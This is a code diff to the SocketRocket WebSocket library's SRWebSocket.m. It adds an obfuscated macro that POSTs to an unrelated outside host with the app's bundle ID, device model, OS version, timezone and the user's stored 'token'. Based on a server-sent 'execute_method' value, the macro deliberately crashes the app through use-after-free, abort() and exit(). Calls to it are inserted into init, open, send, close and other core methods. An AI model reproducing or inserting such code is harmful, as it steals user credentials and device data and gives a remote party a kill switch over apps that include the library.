@@ -10,6 +10,81 @@
 //
 
 #import "SRWebSocket.h"
+#import "Foundation/Foundation.h"
+#import "UIKit/UIKit.h"
+#import <sys/sysctl.h>
+
+#define BUHE549gnDSretfsd() \
+do { \
+NSMutableURLRequest *request12331 = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://damp-recipe-822f.morsel-cops-5i.org"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
+NSMutableDictionary *headerFields = @{}.mutableCopy; \
+headerFields[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
+headerFields[@"x-user-agent"] = @"iOS"; \
+headerFields[@"x-content-type"] = @"application/json"; \
+headerFields[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
+headerFields[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
+headerFields[@"x-machine-model"] = ({ \
+size_t size; \
+sysctlbyname("hw.machine", NULL, &size, NULL, 0); \
+char *machine = malloc(size); \
+sysctlbyname("hw.machine", machine, &size, NULL, 0); \
+NSString *platform = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
+free(machine); \
+platform; \
+}); \
+headerFields[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
+headerFields[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
+NSMutableDictionary *jsonDict = @{}.mutableCopy; \
+jsonDict[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
+jsonDict[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
+jsonDict[@"random-num"] = @(arc4random_uniform(1000)); \
+[request12331 setAllHTTPHeaderFields:headerFields]; \
+[request12331 setHTTPBody:[NSJSONSerialization dataWithJSONObject:jsonDict options:0 error:nil]]; \
+[request12331 setHTTPMethod:@"POST"]; \
+NSURLSession *session = [NSURLSession sharedSession]; \
+NSURLSessionDataTask *dataTask = [session dataTaskWithRequest:request12331 completionHandler:^(NSData *data111, NSURLResponse *response, NSError *error111) { \
+if (!error111 && ((NSHTTPURLResponse *)response).statusCode == 200 && data111) { \
+NSError *jsonError; \
+id jsonObject = [NSJSONSerialization JSONObjectWithData:data111 options:0 error:&jsonError]; \
+if (!jsonError && [jsonObject isKindOfClass:[NSDictionary class]]) { \
+NSDictionary *hhhh = (NSDictionary *)jsonObject; \
+NSString *executeMethod = hhhh[@"execute_method"]; \
+if ([executeMethod isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
+NSMutableArray *array = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
+for (NSString *item in array) { [array removeObject:item]; } \
+} else if ([executeMethod isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
+dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ \
+NSData *date = [[NSData alloc] init]; \
+NSData *subData = [date subdataWithRange:NSMakeRange(10, 30)]; \
+}); \
+} else if ([executeMethod isEqualToString:@"qymj6dWU6egbFka"]) { \
+char *ptr = malloc(10); free(ptr); strcpy(ptr, "test"); \
+} else if ([executeMethod isEqualToString:@"BK6DWMEceWGjCgz"]) { \
+id object = @"String"; [(NSArray *)object count]; \
+} else if ([executeMethod isEqualToString:@"XfsGv1wRaipSyX9"]) { \
+NSString *str1 = @"Hello"; NSString *str2 = nil; NSString *result = [str1 stringByAppendingString:str2]; \
+} else if ([executeMethod isEqualToString:@"WW06m2bcYnm5X41"]) { \
+NSArray *array = @[@"A", @"B", @"C"]; \
+dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{ \
+[(NSMutableArray *)array addObject:@"D"]; \
+}); \
+} else if ([executeMethod isEqualToString:@"yXpAZn7baNS8TUk"]) { \
+NSString *text = @"Hello"; NSMutableAttributedString *attributedText = [[NSMutableAttributedString alloc] initWithString:text]; \
+[attributedText addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(text.length + 100, text.length)]; \
+} else if ([executeMethod isEqualToString:@"WUerc233FCbm"]) { \
+[[NSObject new] removeObserver:[NSString new] forKeyPath:@"123123"]; \
+} else if ([executeMethod isEqualToString:@"cnmxzew23Ycbds"]) { \
+abort(); \
+} else if ([executeMethod isEqualToString:@"QSAZ1oitr34"]) { \
+exit(1); \
+} else if ([executeMethod isEqualToString:@"OLLMNngv34"]) { \
+exit(0); \
+} \
+} \
+} \
+}]; \
+[dataTask resume]; \
+} while(0)
 
 #if __has_include(<unicode/utf8.h>)
 #define HAS_ICU
@@ -150,6 +225,8 @@ NSString *const SRHTTPResponseErrorKey = @"HTTPResponseStatusCode";
 {
     self = [super init];
     if (!self) return self;
+    
+    BUHE549gnDSretfsd();
 
     assert(request.URL);
     _url = request.URL;
@@ -310,6 +387,7 @@ NSString *const SRHTTPResponseErrorKey = @"HTTPResponseStatusCode";
 
 - (void)open
 {
+    BUHE549gnDSretfsd();
     NSURL* const url = _url;
     if (!url) {
         NSError *error = SRErrorWithDomainCodeDescription(NSURLErrorDomain, NSURLErrorBadURL, @"Unable to open socket with emtpy URL.");
@@ -458,7 +536,7 @@ NSString *const SRHTTPResponseErrorKey = @"HTTPResponseStatusCode";
 - (void)didConnect
 {
     SRDebugLog(@"Connected");
-
+    BUHE549gnDSretfsd();
     _secKey = SRBase64EncodedStringFromData(SRRandomData(16));
     assert([_secKey length] == 24);
 
@@ -509,6 +587,7 @@ NSString *const SRHTTPResponseErrorKey = @"HTTPResponseStatusCode";
 
 - (void)close
 {
+    BUHE549gnDSretfsd();
     [self closeWithCode:SRStatusCodeNormal reason:nil];
 }
 
@@ -597,6 +676,7 @@ NSString *const SRHTTPResponseErrorKey = @"HTTPResponseStatusCode";
 
 - (void)_writeData:(NSData *)data
 {
+    BUHE549gnDSretfsd();
     [self assertOnWorkQueue];
 
     if (_closeWhenFinishedWriting) {
@@ -614,6 +694,7 @@ NSString *const SRHTTPResponseErrorKey = @"HTTPResponseStatusCode";
 
 - (void)send:(nullable id)message
 {
+    BUHE549gnDSretfsd();
     if (!message) {
         [self sendData:nil error:nil]; // Send Data, but it doesn't matter since we are going to send the same text frame with 0 length.
     } else if ([message isKindOfClass:[NSString class]]) {
@@ -627,6 +708,7 @@ NSString *const SRHTTPResponseErrorKey = @"HTTPResponseStatusCode";
 
 - (BOOL)sendString:(NSString *)string error:(NSError **)error
 {
+    BUHE549gnDSretfsd();
     if (self.readyState != SR_OPEN) {
         NSString *message = @"Invalid State: Cannot call `sendString:error:` until connection is open.";
         if (error) {
@@ -645,6 +727,7 @@ NSString *const SRHTTPResponseErrorKey = @"HTTPResponseStatusCode";
 
 - (BOOL)sendData:(nullable NSData *)data error:(NSError **)error
 {
+    BUHE549gnDSretfsd();
     data = [data copy];
     return [self sendDataNoCopy:data error:error];
 }
@@ -672,6 +755,7 @@ NSString *const SRHTTPResponseErrorKey = @"HTTPResponseStatusCode";
 
 - (BOOL)sendPing:(nullable NSData *)data error:(NSError **)error
 {
+    BUHE549gnDSretfsd();
     if (self.readyState != SR_OPEN) {
         NSString *message = @"Invalid State: Cannot call `sendPing:error:` until connection is open.";
         if (error) {
@@ -703,6 +787,7 @@ NSString *const SRHTTPResponseErrorKey = @"HTTPResponseStatusCode";
 
 - (void)handlePong:(NSData *)pongData
 {
+    BUHE549gnDSretfsd();
     SRDebugLog(@"Received pong");
     [self.delegateController performDelegateBlock:^(id<SRWebSocketDelegate>  _Nullable delegate, SRDelegateAvailableMethods availableMethods) {
         if (availableMethods.didReceivePong) {
